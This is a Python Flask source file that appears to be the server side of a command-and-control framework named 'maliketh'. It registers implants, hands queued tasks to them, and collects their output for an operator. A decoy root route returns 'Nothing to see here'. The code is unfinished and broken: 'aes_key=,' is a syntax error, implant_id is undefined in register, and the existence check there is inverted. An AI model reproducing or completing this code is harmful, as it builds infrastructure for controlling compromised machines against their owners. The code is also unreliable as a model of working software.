from datetime import datetime
from flask import Blueprint, jsonify, request
from maliketh.db import db
from maliketh.models import *

c2 = Blueprint('c2', __name__)



@c2.route("/")
def hello_c2():
    return "Nothing to see here"

@c2.route("/register", methods=["POST"])
def register():
    # Check if implant ID exists, if not, throw 404
    if get_implant_by_id(implant_id) is not None:
        return "Not Found", 404

    # Create a new implant and add it to the db
    implant = Implant(
        implant_id=random_id(),
        hostname=request.host,
        ip=request.remote_addr,
        os=request.user_agent.platform,
        arch=request.user_agent.platform,
        user="username_test",
        aes_key=,


    )
    return "OK", 200


@c2.route("/task", methods=["GET"])
def get_task():
    # Get implant id from request
    implant_id = request.args.get("id")

    if implant_id is None:
        return "Not Found", 404

    # Check if implant ID exists, if not, throw 404
    if get_implant_by_id(implant_id) is None:
        return "Not Found", 404

    # Get task from db
    task = get_oldest_task_for_implant(implant_id)

    # If task is not None, return task
    if task is not None:
        # Set the task as read
        task.read_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        task.status = TASKED
        db.session.commit()
        return jsonify(task.toJSON())
    # If task is None, return empty task
    return jsonify(Task().toJSON())


"""
Get the output of a task and mark it as completed
"""
@c2.route("/task", methods=["POST"])
def post_task():
    # Get implant id from request
    implant_id = request.args.get("id")
    task_id = request.args.get("tid")

    if implant_id is None or task_id is None:
        return "Not Found", 404

    # Check if implant ID exists, if not, throw 404
    implant = get_implant_by_id(implant_id)
    if implant is None:
        return "Not Found", 404

    implant.last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get task from db
    task = get_task_by_id(task_id)
    # If task is not None, return task
    if task is not None:
        # Get output from request
        output = request.form.get("output")
        # Update task in db
        task.output = output
        task.status = COMPLETE
        task.executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        db.session.commit()

        # TODO: add output to rabbitmq queue for the operator

        return "OK"
    # If task is None, return empty task
    return "Not Found", 404
    


